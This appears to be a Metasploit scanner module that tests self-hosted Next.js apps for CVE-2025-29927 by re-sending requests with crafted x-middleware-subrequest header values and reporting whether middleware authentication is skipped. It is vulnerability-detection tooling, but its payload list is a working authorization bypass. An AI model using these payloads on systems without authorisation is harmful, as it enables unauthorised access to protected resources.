##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # HTTP status codes that indicate the request was gated (blocked or redirected)
  # by middleware rather than served.
  GATE_CODES = [301, 302, 303, 307, 308, 401, 403].freeze

  # x-middleware-subrequest values to try, covering Next.js 12.2 through 15.x.
  # Next.js >= ~13.2 only skips middleware once the middleware module name appears
  # five times (MAX_RECURSION_DEPTH); earlier lines accept a single occurrence, and
  # the "src/" variants apply when middleware lives under a src/ directory.
  PAYLOADS = [
    'middleware:middleware:middleware:middleware:middleware',
    'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware',
    'middleware',
    'src/middleware',
    'pages/_middleware'
  ].freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Next.js Middleware Authorization Bypass Scanner',
        'Description' => %q{
          This module detects self-hosted Next.js applications affected by
          CVE-2025-29927, an authorization bypass in the middleware layer. Next.js
          tags its own internal subrequests with the x-middleware-subrequest header
          and skips middleware when it sees it. The header is trusted without
          verifying it originated internally, so an external client that supplies it
          causes middleware to be skipped entirely, bypassing any authentication,
          authorization, or redirects implemented there. Affected self-hosted
          versions are < 12.3.5, < 13.5.9, < 14.2.25, and < 15.2.3.

          The module performs a differential check: it sends a baseline request to a
          user-supplied, normally middleware-gated path (expecting a redirect or a
          401/403), then repeats the request with a crafted x-middleware-subrequest
          header. If the gate disappears (the protected resource is served, or the
          middleware redirect to login is gone), the target is reported vulnerable.
          This is detection only; the module does not act on the bypassed response.
        },
        'Author' => [
          'Rachid Allam', # vulnerability discovery (zhero)
          'Yasser Allam', # vulnerability discovery (inzo)
          'Kenneth LaCroix' # Metasploit module
        ],
        'References' => [
          ['CVE', '2025-29927'],
          ['GHSA', 'f82v-jwr5-mffw'],
          ['URL', 'https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass']
        ],
        'DisclosureDate' => '2025-03-21',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DefaultOptions' => { 'RPORT' => 3000, 'SSL' => false }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'A path normally gated by Next.js middleware (e.g. an authenticated route that redirects to login)', '/dashboard']),
        OptString.new('SUBREQUEST_PAYLOAD', [false, 'Force a single x-middleware-subrequest value instead of trying the built-in list', ''])
      ]
    )
  end

  def payloads
    forced = datastore['SUBREQUEST_PAYLOAD'].to_s
    forced.empty? ? PAYLOADS : [forced]
  end

  # Best-effort Next.js fingerprint, used for reporting only (the differential is the
  # authoritative signal; the header may be stripped by a proxy).
  def nextjs?(res)
    return false unless res
    return true if res.headers['X-Powered-By'].to_s.include?('Next.js')
    return true if res.headers.keys.any? { |k| k.downcase.start_with?('x-nextjs-') }

    res.body.to_s.include?('/_next/static/')
  end

  def describe_response(res)
    loc = res.headers['location'].to_s
    loc.empty? ? "HTTP #{res.code}" : "HTTP #{res.code} -> #{loc}"
  end

  def baseline_request
    send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path))
  end

  # Returns { payload:, response: } for the first payload that defeats the gate,
  # or nil. Relative to the gated baseline, a bypass is detected when the middleware
  # gate no longer applies: either the response is no longer a gate status (e.g. the
  # protected page is served with 200), or it is still a redirect but to a different
  # target (the middleware login redirect is gone, e.g. trailing-slash normalization
  # to the real route). Comparing the Location avoids missing a same-status bypass.
  def bypassing_payload(baseline)
    base_loc = baseline.headers['location'].to_s
    payloads.each do |payload|
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path),
        'headers' => { 'x-middleware-subrequest' => payload }
      )
      next unless res
      next if res.code >= 500

      gate_gone = !GATE_CODES.include?(res.code) && res.code != baseline.code
      redirect_changed = GATE_CODES.include?(res.code) &&
                         (res.code != baseline.code || res.headers['location'].to_s != base_loc)
      return { payload: payload, response: res } if gate_gone || redirect_changed
    end
    nil
  end

  def check_host(_ip)
    baseline = baseline_request
    return Exploit::CheckCode::Unknown('No response to the baseline request') unless baseline
    unless GATE_CODES.include?(baseline.code)
      return Exploit::CheckCode::Detected("#{target_uri.path} is not middleware-gated (#{describe_response(baseline)}); set TARGETURI to a protected path")
    end

    hit = bypassing_payload(baseline)
    return Exploit::CheckCode::Safe("#{target_uri.path} gated (#{describe_response(baseline)}); not bypassed") if hit.nil?

    Exploit::CheckCode::Vulnerable("Middleware bypassed: #{describe_response(baseline)} -> #{describe_response(hit[:response])} with '#{hit[:payload]}'")
  end

  def run_host(_ip)
    baseline = baseline_request
    if baseline.nil?
      print_error("#{peer} - No response to the baseline request on #{target_uri.path}")
      return
    end
    unless GATE_CODES.include?(baseline.code)
      vprint_status("#{peer} - #{target_uri.path} is not middleware-gated (#{describe_response(baseline)}); set TARGETURI to a protected path")
      return
    end
    vprint_status("#{peer} - Baseline #{describe_response(baseline)} on #{target_uri.path}#{nextjs?(baseline) ? ' (Next.js detected)' : ''}")

    hit = bypassing_payload(baseline)
    if hit.nil?
      print_status("#{peer} - #{target_uri.path} gated (#{describe_response(baseline)}); not bypassed (patched or not Next.js middleware)")
      return
    end

    print_good("#{peer} - Next.js middleware authorization bypass confirmed (CVE-2025-29927): #{describe_response(baseline)} -> #{describe_response(hit[:response])} with x-middleware-subrequest '#{hit[:payload]}'")
    report_vuln(
      host: rhost,
      port: rport,
      name: name,
      info: "x-middleware-subrequest bypass on #{target_uri.path}; #{describe_response(baseline)} -> #{describe_response(hit[:response])}",
      refs: references
    )
  end
end
